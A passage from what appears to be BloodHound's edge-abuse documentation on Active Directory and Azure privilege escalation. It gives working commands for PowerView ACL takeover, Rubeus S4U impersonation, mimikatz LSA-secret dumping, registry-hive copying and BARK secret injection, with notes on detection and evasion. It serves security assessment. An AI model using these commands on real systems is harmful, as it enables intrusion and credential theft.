<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">gmsapasswordreader</span><span class="o">.</span><span class="n">exe</span> <span class="o">--</span><span class="n">accountname</span> <span class="n">gmsa</span><span class="o">-</span><span class="n">jkohler</span>
</pre></div>
</div>
<p>At this point you are ready to use the NT hash the same way you would with a regular user account.
You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input.</p>
</section>
<section id="id65">
<h3>Opsec Considerations<a class="headerlink" href="#id65" title="Link to this heading"></a></h3>
<p>When abusing a GMSA that is already logged onto a system, you will have the same opsec considerations as when
abusing a standard user logon. For more information about that, see the “HasSession” modal’s opsec considerations tab.</p>
<p>When retrieving the GMSA password from Active Directory, you may generate a 4662 event on the Domain Controller;
however, that event will likely perfectly resemble a legitimate event if you request the password from the same
context as a computer account that is already authorized to read the GMSA password.</p>
</section>
<section id="id66">
<h3>References<a class="headerlink" href="#id66" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/">https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/</a></p></li>
<li><p><a class="reference external" href="https://www.powershellgallery.com/packages/DSInternals/">https://www.powershellgallery.com/packages/DSInternals/</a></p></li>
<li><p><a class="reference external" href="https://github.com/markgamache/gMSA/tree/master/PSgMSAPwd">https://github.com/markgamache/gMSA/tree/master/PSgMSAPwd</a></p></li>
<li><p><a class="reference external" href="https://adsecurity.org/?p=36">https://adsecurity.org/?p=36</a></p></li>
<li><p><a class="reference external" href="https://adsecurity.org/?p=2535">https://adsecurity.org/?p=2535</a></p></li>
<li><p><a class="reference external" href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4662">https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4662</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="contains">
<h2>Contains<a class="headerlink" href="#contains" title="Link to this heading"></a></h2>
<p>GPOs linked to a container apply to all objects that are contained by the container. Additionally,
ACEs set on a parent OU may inherit down to child objects.</p>
<section id="id67">
<h3>Abuse Info<a class="headerlink" href="#id67" title="Link to this heading"></a></h3>
<p>With control of an OU, you may add a new ACE on the OU that will inherit down to the objects under that
OU. Below are two options depending on how targeted you choose to be in this step:</p>
<p>Generic Descendent Object Takeover:</p>
<p>The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU
that will inherit down to all object types. Again, this can be done using PowerView. This time we will use
the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU.</p>
<p>First, we need to reference the OU by its ObjectGUID, not its name. You can find the ObjectGUID for the OU
in the BloodHound GUI by clicking the OU, then inspecting the <em>objectid</em> value</p>
<p>Next, we will fetch the GUID for all objects. This should be ‘00000000-0000-0000-0000-000000000000’:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq &#39;All&#39;} | select -ExpandProperty name
</pre></div>
</div>
<p>Then we will construct our ACE. This command will create an ACE granting the “JKHOLER” user full control of
all descendant objects:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity &#39;JKOHLER&#39; -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
</pre></div>
</div>
<p>Finally, we will apply this ACE to our target OU:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = &#39;Dacl&#39;
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
</pre></div>
</div>
<p>Now, the “JKOHLER” user will have full control of all descendent objects of each type.</p>
<p>Targeted Descendent Object Takeoever:</p>
<p>If you want to be more targeted with your approach, it is possible to specify precisely what right you want
to apply to precisely which kinds of descendent objects. You could, for example, grant a user
“ForceChangePassword” privilege against all user objects, or grant a security group the ability to read every
GMSA password under a certain OU. Below is an example taken from PowerView’s help text on how to grant the
“ITADMIN” user the ability to read the LAPS password from all computer objects in the “Workstations” OU:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq &#39;ms-Mcs-AdmPwd&#39;} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq &#39;Computer&#39;} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = &#39;Dacl&#39;
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
</pre></div>
</div>
</section>
<section id="id68">
<h3>Opsec Considerations<a class="headerlink" href="#id68" title="Link to this heading"></a></h3>
</section>
<section id="id69">
<h3>References<a class="headerlink" href="#id69" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://wald0.com/?p=179">https://wald0.com/?p=179</a></p></li>
<li><p><a class="reference external" href="https://blog.cptjesus.com/posts/bloodhound15">https://blog.cptjesus.com/posts/bloodhound15</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="allextendedrights">
<h2>AllExtendedRights<a class="headerlink" href="#allextendedrights" title="Link to this heading"></a></h2>
<p>Extended rights are special rights granted on objects which allow reading of privileged
attributes, as well as performing special actions.</p>
<section id="id70">
<h3>Abuse Info<a class="headerlink" href="#id70" title="Link to this heading"></a></h3>
<p><strong>Users</strong></p>
<p>Having this privilege over a user grants the ability to reset the user’s password. For
more information about that, see the ForceChangePassword edge section</p>
<p><strong>Computers</strong></p>
<p>You may perform resource-based constrained delegation with this privilege over a computer
object. For more information about that, see the GenericAll edge section.</p>
<p><strong>Domain</strong>
The AllExtendedRights privilege grants both the
DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
privileges, which combined allow a principal to replicate objects from the domain.
This can be abused using the lsadump::dcsync command in mimikatz.</p>
</section>
<section id="id71">
<h3>Opsec Considerations<a class="headerlink" href="#id71" title="Link to this heading"></a></h3>
<p>This will depend on the actual attack performed. See the particular opsec considerations
sections for the ForceChangePassword, AddMembers, and GenericAll edges for more info</p>
</section>
<section id="id72">
<h3>References<a class="headerlink" href="#id72" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="gplink">
<h2>GPLink<a class="headerlink" href="#gplink" title="Link to this heading"></a></h2>
<p>A linked GPO applies its settings to objects in the linked container.</p>
<section id="id73">
<h3>Abuse Info<a class="headerlink" href="#id73" title="Link to this heading"></a></h3>
<p>This edge helps you understand which object a GPO applies to, and so the actual abuse
is actually being performed against the GPO this edge originates from. For more info
about that abuse, see the GenericAll edge section for when you have full control over
a GPO.</p>
</section>
<section id="id74">
<h3>Opsec Considerations<a class="headerlink" href="#id74" title="Link to this heading"></a></h3>
<p>See the GenericAll edge section for opsec considerations</p>
</section>
<section id="id75">
<h3>References<a class="headerlink" href="#id75" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://wald0.com/?p=179">https://wald0.com/?p=179</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="allowedtoact">
<h2>AllowedToAct<a class="headerlink" href="#allowedtoact" title="Link to this heading"></a></h2>
<p>An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to
impersonate any domain user to the target computer system and receive a valid service
ticket “as” this user.</p>
<p>One caveat is that impersonated users can not be in the “Protected Users” security group
or otherwise have delegation privileges revoked. Another caveat is that the principal
added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL <em>must</em> have a service principal
name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an
attacker does not currently control an account with a SPN set, an attacker can abuse the
default domain MachineAccountQuota settings to add a computer account that the attacker
controls via the Powermad project.</p>
<p>This clip demonstrates how to abuse this edge:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/fqYoOoghqdE?t=1814?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><section id="id76">
<h3>Abuse Info<a class="headerlink" href="#id76" title="Link to this heading"></a></h3>
<p>Abusing this primitive is currently only possible through the Rubeus project.</p>
<p>To use this attack, the controlled account MUST have a service principal name set, along
with access to either the plaintext or the RC4_HMAC hash of the account.</p>
<p>If the plaintext password is available, you can hash it to the RC4_HMAC version using Rubeus:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Rubeus.exe hash /password:Summer2018!
</pre></div>
</div>
<p>Use Rubeus’ <em>s4u</em> module to get a service ticket for the service name (sname) we want to
“pretend” to be “admin” for. This ticket is injected (thanks to /ptt), and in this case
grants us access to the file system of the TARGETCOMPUTER:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="o">&lt;</span><span class="n">trusted</span> <span class="n">user</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">EF266C6B963C0BB683941032008AD47F</span> <span class="o">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">admin</span> <span class="o">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="o">/</span><span class="n">TARGETCOMPUTER</span><span class="o">.</span><span class="n">testlab</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">ptt</span>
</pre></div>
</div>
</section>
<section id="id77">
<h3>Opsec Considerations<a class="headerlink" href="#id77" title="Link to this heading"></a></h3>
<p>To execute this attack, the Rubeus C# assembly needs to be executed on some system with the
ability to send/receive traffic in the domain.</p>
</section>
<section id="id78">
<h3>References<a class="headerlink" href="#id78" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a></p></li>
<li><p><a class="reference external" href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a></p></li>
<li><p><a class="reference external" href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/redteaming/another-word-on-delegation/">https://blog.harmj0y.net/redteaming/another-word-on-delegation/</a></p></li>
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p></li>
<li><p><a class="reference external" href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="addallowedtoact">
<h2>AddAllowedToAct<a class="headerlink" href="#addallowedtoact" title="Link to this heading"></a></h2>
<p>The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker
to abuse resource-based constrained delegation to compromise the remote computer system. This
property is a binary DACL that controls what security principals can pretend to be any domain
user to the particular computer object.</p>
<p>This clip demonstrates how to abuse this edge:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/fqYoOoghqdE?t=1814?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><section id="id79">
<h3>Abuse Info<a class="headerlink" href="#id79" title="Link to this heading"></a></h3>
<p>See the AllowedToAct edge section for abuse info</p>
</section>
<section id="id80">
<h3>Opsec Considerations<a class="headerlink" href="#id80" title="Link to this heading"></a></h3>
<p>See the AllowedToAct edge section for opsec considerations</p>
</section>
<section id="id81">
<h3>References<a class="headerlink" href="#id81" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a></p></li>
<li><p><a class="reference external" href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a></p></li>
<li><p><a class="reference external" href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/redteaming/another-word-on-delegation/">https://blog.harmj0y.net/redteaming/another-word-on-delegation/</a></p></li>
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p></li>
<li><p><a class="reference external" href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="writeaccountrestrictions">
<h2>WriteAccountRestrictions<a class="headerlink" href="#writeaccountrestrictions" title="Link to this heading"></a></h2>
<p>This edge indicates the principal has the ability to write to modify several properties on the target principal, most notably the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.</p>
<p>This clip demonstrates how to abuse this edge:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/fqYoOoghqdE?t=1814?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><section id="id82">
<h3>Abuse Info<a class="headerlink" href="#id82" title="Link to this heading"></a></h3>
<p>See the AllowedToAct edge section for abuse info</p>
</section>
<section id="id83">
<h3>Opsec Considerations<a class="headerlink" href="#id83" title="Link to this heading"></a></h3>
<p>See the AllowedToAct edge section for opsec considerations</p>
</section>
<section id="id84">
<h3>References<a class="headerlink" href="#id84" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/">https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-account-restrictions">https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-account-restrictions</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="trustedby">
<h2>TrustedBy<a class="headerlink" href="#trustedby" title="Link to this heading"></a></h2>
<p>This edge is used to keep track of domain trusts, and maps to the direction of access.</p>
<section id="id85">
<h3>Abuse Info<a class="headerlink" href="#id85" title="Link to this heading"></a></h3>
<p>This edge will come in handy when analzying how to jump a forest trust to get enterprise
admin access from domain admin access within a forest. For more information about that
attack, see <a class="reference external" href="https://blog.harmj0y.net/redteaming/the-trustpocalypse/">https://blog.harmj0y.net/redteaming/the-trustpocalypse/</a></p>
</section>
<section id="id86">
<h3>References<a class="headerlink" href="#id86" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://blog.harmj0y.net/redteaming/the-trustpocalypse/">https://blog.harmj0y.net/redteaming/the-trustpocalypse/</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="synclapspassword">
<h2>SyncLAPSPassword<a class="headerlink" href="#synclapspassword" title="Link to this heading"></a></h2>
<p>A principal with this signifies the capability of retrieving, through a directory
synchronization, the value of confidential and RODC filtered attributes, such as
LAPS’ <em>ms-Mcs-AdmPwd</em>.</p>
<section id="id87">
<h3>Abuse Info<a class="headerlink" href="#id87" title="Link to this heading"></a></h3>
<p>To abuse these privileges, use DirSync:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Sync</span><span class="o">-</span><span class="n">LAPS</span> <span class="o">-</span><span class="n">LDAPFilter</span> <span class="s1">&#39;(samaccountname=TargetComputer$)&#39;</span>
</pre></div>
</div>
<p>For other optional parameters, view the DirSync documentation.</p>
</section>
<section id="id88">
<h3>Opsec Considerations<a class="headerlink" href="#id88" title="Link to this heading"></a></h3>
<p>Executing the attack will generate a 4662 (An operation was performed on an object)
event at the domain controller if an appropriate SACL is in place on the target object.</p>
</section>
<section id="id89">
<h3>References<a class="headerlink" href="#id89" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/simondotsh/DirSync">https://github.com/simondotsh/DirSync</a></p></li>
<li><p><a class="reference external" href="https://simondotsh.com/infosec/2022/07/11/dirsync.html">https://simondotsh.com/infosec/2022/07/11/dirsync.html</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="dumpsmsapassword">
<h2>DumpSMSAPassword<a class="headerlink" href="#dumpsmsapassword" title="Link to this heading"></a></h2>
<p>A computer with this indicates that a Standalone Managed Service Account (sMSA)
is installed on it. An actor with administrative privileges on the computer
can retrieve the sMSA’s password by dumping LSA secrets.</p>
<section id="id90">
<h3>Abuse Info<a class="headerlink" href="#id90" title="Link to this heading"></a></h3>
<p>From an elevated command prompt on the computer where the sMSA resides, run
mimikatz then execute the following commands:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
<span class="n">token</span><span class="p">::</span><span class="n">elevate</span>
<span class="n">lsadump</span><span class="p">::</span><span class="n">secrets</span>
</pre></div>
</div>
<p>In the output, find <em>_SC_{262E99C9-6160-4871-ACEC-4E61736B6F21}_</em> suffixed by the
name of the targeted sMSA. The next line contains <em>cur/hex :</em> followed with the
sMSA’s password hex-encoded.</p>
<p>To use this password, its NT hash must be calculated. This can be done using
a small python script:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># nt.py</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="w"> </span><span class="nn">hashlib</span>

<span class="n">pw_hex</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">nt_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;md4&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">pw_hex</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="nb">print</span><span class="p">(</span><span class="n">nt_hash</span><span class="p">)</span>
</pre></div>
</div>
<p>Execute it like so:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python3</span> <span class="n">nt</span><span class="o">.</span><span class="n">py</span> <span class="mi">35</span><span class="n">f3e1713d61</span><span class="o">...</span>
</pre></div>
</div>
<p>To authenticate as the sMSA, leverage pass-the-hash.</p>
<p>Alternatively, to avoid executing mimikatz on the host, you can save a copy of
the <em>SYSTEM</em> and <em>SECURITY</em> registry hives from an elevated prompt:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span>\<span class="n">SYSTEM</span> <span class="o">%</span><span class="n">temp</span><span class="o">%</span>\<span class="n">SYSTEM</span> <span class="o">&amp;</span> <span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span>\<span class="n">SECURITY</span> <span class="o">%</span><span class="n">temp</span><span class="o">%</span>\<span class="n">SECURITY</span>
</pre></div>
</div>
<p>Transfer the files named <em>SYSTEM</em> and <em>SECURITY</em> that were saved at <em>%temp%</em> to
another computer where mimikatz can be safely executed.</p>
<p>On this other computer, run mimikatz from a command prompt then execute the
following command to obtain the hex-encoded password:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">lsadump</span><span class="p">::</span><span class="n">secrets</span> <span class="o">/</span><span class="n">system</span><span class="p">:</span><span class="n">C</span><span class="p">:</span>\<span class="n">path</span>\<span class="n">to</span>\<span class="n">file</span>\<span class="n">SYSTEM</span> <span class="o">/</span><span class="n">security</span><span class="p">:</span><span class="n">C</span><span class="p">:</span>\<span class="n">path</span>\<span class="n">to</span>\<span class="n">file</span>\<span class="n">SECURITY</span>
</pre></div>
</div>
</section>
<section id="id91">
<h3>Opsec Considerations<a class="headerlink" href="#id91" title="Link to this heading"></a></h3>
<p>Access to registry hives can be monitored and alerted via event ID 4656
(A handle to an object was requested).</p>
</section>
<section id="id92">
<h3>References<a class="headerlink" href="#id92" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://simondotsh.com/infosec/2022/12/12/assessing-smsa.html">https://simondotsh.com/infosec/2022/12/12/assessing-smsa.html</a></p></li>
<li><p><a class="reference external" href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets">https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets</a></p></li>
<li><p><a class="reference external" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azaddmembers">
<h2>AZAddMembers<a class="headerlink" href="#azaddmembers" title="Link to this heading"></a></h2>
<p>The ability to add other principals to an Azure security group</p>
<section id="id93">
<h3>Abuse Info<a class="headerlink" href="#id93" title="Link to this heading"></a></h3>
<p>Via the Azure portal:
1. Find the group in your tenant (Azure Active Directory -&gt; Groups -&gt; Find Group in list)
2. Click the group from the list
3. In the left pane, click “Members”
4. At the top, click “Add members”
5. Find the principals you want to add to the group and click them, then click “select” at the bottom
6. You should see a message in the top right saying “Member successfully added”</p>
<p>Via PowerZure: Add-AzureADGroup -User [UPN] -Group [Group name]</p>
</section>
<section id="id94">
<h3>Opsec Considerations<a class="headerlink" href="#id94" title="Link to this heading"></a></h3>
<p>The Azure activity log for the tenant will log who added what principal to what group, including the date and time.</p>
</section>
<section id="id95">
<h3>References<a class="headerlink" href="#id95" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadgroup">https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadgroup</a>
<a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/azuread/add-azureadgroupmember?view=azureadps-2.0-preview">https://docs.microsoft.com/en-us/powershell/module/azuread/add-azureadgroupmember?view=azureadps-2.0-preview</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azaddowner">
<h2>AZAddOwner<a class="headerlink" href="#azaddowner" title="Link to this heading"></a></h2>
<p>This edge is created during post-processing. It is created against
all App Registrations and Service Principals within the same tenant
when an Azure principal has one of the following Azure Active
Directory roles:</p>
<ul class="simple">
<li><p>Hybrid Identity Administrator</p></li>
<li><p>Partner Tier1 Support</p></li>
<li><p>Partner Tier2 Support</p></li>
<li><p>Directory Synchronization Accounts</p></li>
</ul>
<p>You will not see these privileges when auditing permissions against
any of the mentioned objects when you use Microsoft tooling, including
the Azure portal or any API.</p>
<section id="id96">
<h3>Abuse Info<a class="headerlink" href="#id96" title="Link to this heading"></a></h3>
<p>You can use BARK to add a new owner to the target object. The
BARK function you use will depend on the target object type,
but all of the functions follow a similar syntax.</p>
<p>These functions require you to supply an MS Graph-scoped JWT
associated with the principal that has the privilege to add a
new owner to your target object. There are several ways to
acquire a JWT. For example, you may use BARK’s
Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT
by supplying a refresh token:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$MGToken = Get-GraphTokenWithRefreshToken `
    -RefreshToken &quot;0.ARwA6WgJJ9X2qk...&quot; `
    -TenantID &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>To add a new owner to a Service Principal, use BARK’s
New-ServicePrincipalOwner function:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-ServicePrincipalOwner `
    -ServicePrincipalObjectId &quot;082cf9b3-24e2-427b-bcde-88ffdccb5fad&quot; `
    -NewOwnerObjectId &quot;cea271c4-7b01-4f57-932d-99d752bbbc60&quot; `
    -Token $Token
</pre></div>
</div>
<p>To add a new owner to an App Registration, use BARK’s New-AppOwner function:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AppOwner `
    -AppObjectId &quot;52114a0d-fa5b-4ee5-9a29-2ba048d46eee&quot; `
    -NewOwnerObjectId &quot;cea271c4-7b01-4f57-932d-99d752bbbc60&quot; `
    -Token $Token
</pre></div>
</div>
</section>
<section id="id97">
<h3>Opsec Considerations<a class="headerlink" href="#id97" title="Link to this heading"></a></h3>
<p>Any time you add an owner to any Azure object, the AzureAD audit
logs will create an event logging who added an owner to what object,
as well as what the new owner added to the object was.</p>
</section>
<section id="id98">
<h3>References<a class="headerlink" href="#id98" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azaddsecret">
<h2>AZAddSecret<a class="headerlink" href="#azaddsecret" title="Link to this heading"></a></h2>
<p>Azure provides several systems and mechanisms for granting
control of securable objects within Azure Active Directory,
including tenant-scoped admin roles, object-scoped admin roles,
explicit object ownership, and API permissions.</p>
<p>When a principal has been granted “Cloud App Admin” or “App
Admin” against the tenant, that principal gains the ability to
add new secrets to all Service Principals and App Registrations.
Additionally, a principal that has been granted “Cloud App
Admin” or “App Admin” against, or explicit ownership of a
Service Principal or App Registration gains the ability to add
secrets to that particular object.</p>
<section id="id99">
<h3>Abuse Info<a class="headerlink" href="#id99" title="Link to this heading"></a></h3>
<p>There are several ways to perform this abuse, depending on what
sort of access you have to the credentials of the object that
holds this privilege against the target object. If you have an
interactive web browser session for the Azure portal, it is as
simple as finding the target App in the portal and adding a new
secret to the object using the “Certificates &amp; secrets” tab.
Service Principals do not have this tab in the Azure portal but
you can add secrets to them with the MS Graph API.
No matter what kind of control you have, you will be able to
perform this abuse by using BARK’s New-AppRegSecret or
New-ServicePrincipalSecret functions.</p>
<p>These functions require you to supply an MS Graph-scoped JWT
associated with the principal that has the privilege to add a
new secret to your target application. There are several ways to
acquire a JWT. For example, you may use BARK’s
Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT
by supplying a refresh token:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken &quot;0.ARwA6WgJJ9X2qk...&quot; -TenantID &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>Then use BARK’s New-AppRegSecret to add a new secret to the
target application:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AppRegSecret -AppRegObjectID &quot;d878...&quot; -Token $MGToken.access_token
</pre></div>
</div>
<p>The output will contain the plain-text secret you just created
for the target app:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AppRegSecret -AppRegObjectID &quot;d878...&quot; -Token $MGToken.access_token

Name              Value
----              -----
AppRegSecretValue odg8Q~...
AppRegAppId       4d31...
AppRegObjectId    d878...
</pre></div>
</div>
<p>With this plain text secret, you can now acquire tokens as the
service principal associated with the app. You can easily do
this with BARK’s Get-MSGraphToken function:</p>
